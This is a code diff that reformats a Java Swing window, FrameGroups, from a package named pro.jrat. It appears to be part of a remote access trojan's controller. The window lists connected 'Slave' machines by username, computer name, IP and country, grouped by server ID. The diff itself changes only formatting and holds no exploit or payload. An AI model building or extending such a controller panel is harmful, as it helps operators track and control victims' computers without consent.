@@ -23,7 +23,6 @@ import pro.jrat.Main;
 import pro.jrat.Slave;
 import pro.jrat.ui.renderers.GroupTreeRenderer;
 
-
 @SuppressWarnings("serial")
 public class FrameGroups extends BaseFrame {
 
@@ -40,10 +39,10 @@ public class FrameGroups extends BaseFrame {
 		contentPane = new JPanel();
 		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
 		setContentPane(contentPane);
-		
+
 		JScrollPane scrollPane = new JScrollPane();
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
-		
+
 		JButton btnReload = new JButton("Reload");
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
@@ -54,73 +53,58 @@ public class FrameGroups extends BaseFrame {
 			}
 		});
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(
-			gl_contentPane.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
-						.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 421, GroupLayout.PREFERRED_SIZE)
-						.addComponent(btnReload))
-					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
-		);
-		gl_contentPane.setVerticalGroup(
-			gl_contentPane.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 221, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.RELATED, 8, Short.MAX_VALUE)
-					.addComponent(btnReload))
-		);
-		
+		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 421, GroupLayout.PREFERRED_SIZE).addComponent(btnReload)).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
+		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 221, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, 8, Short.MAX_VALUE).addComponent(btnReload)));
+
 		tree = new JTree();
 		tree.setCellRenderer(new GroupTreeRenderer());
 		tree.setShowsRootHandles(true);
-		tree.setModel(new DefaultTreeModel(
-			new DefaultMutableTreeNode("root") {
-				{
-					root = this;
-				}
+		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("root") {
+			{
+				root = this;
 			}
-		));
+		}));
 		scrollPane.setViewportView(tree);
 		contentPane.setLayout(gl_contentPane);
-		
+
 		load();
 	}
-	
+
 	public void load() {
-		DefaultTreeModel model = (DefaultTreeModel)tree.getModel();
-		
-		GroupTreeRenderer renderer = (GroupTreeRenderer)tree.getCellRenderer();
-		
+		DefaultTreeModel model = (DefaultTreeModel) tree.getModel();
+
+		GroupTreeRenderer renderer = (GroupTreeRenderer) tree.getCellRenderer();
+
 		HashMap<String, DefaultMutableTreeNode> nodes = new HashMap<String, DefaultMutableTreeNode>();
-		
-		List<Slave> list = Main.connections; 
-		
+
+		List<Slave> list = Main.connections;
+
 		renderer.icons.clear();
-		
+
 		for (int i = 0; i < list.size(); i++) {
-			Slave slave = list.get(i);	
+			Slave slave = list.get(i);
 			String val = slave.getUsername() + "@" + slave.getComputerName() + " / " + slave.getIP();
 			renderer.icons.put(val.toLowerCase(), slave.getFlag());
-			
-			if (nodes.containsKey(slave.getServerID())) {			
+
+			if (nodes.containsKey(slave.getServerID())) {
 				model.insertNodeInto(new DefaultMutableTreeNode(val), nodes.get(slave.getServerID()), nodes.get(slave.getServerID()).getChildCount());
-			} else {			
+			} else {
 				DefaultMutableTreeNode r = new DefaultMutableTreeNode(slave.getServerID());
 				nodes.put(slave.getServerID(), r);
 				model.insertNodeInto(nodes.get(slave.getServerID()), root, root.getChildCount());
 				model.insertNodeInto(new DefaultMutableTreeNode(val), nodes.get(slave.getServerID()), nodes.get(slave.getServerID()).getChildCount());
 			}
 		}
-		
+
 		expandAll();
 	}
-	
+
 	public void expandAll() {
 		for (int i = 0; i < tree.getRowCount(); i++) {
 			tree.expandRow(i);
 		}
 	}
-	
+
 	public void collapseAll() {
 		for (int i = 0; i < tree.getRowCount(); i++) {
 			tree.collapseRow(i);
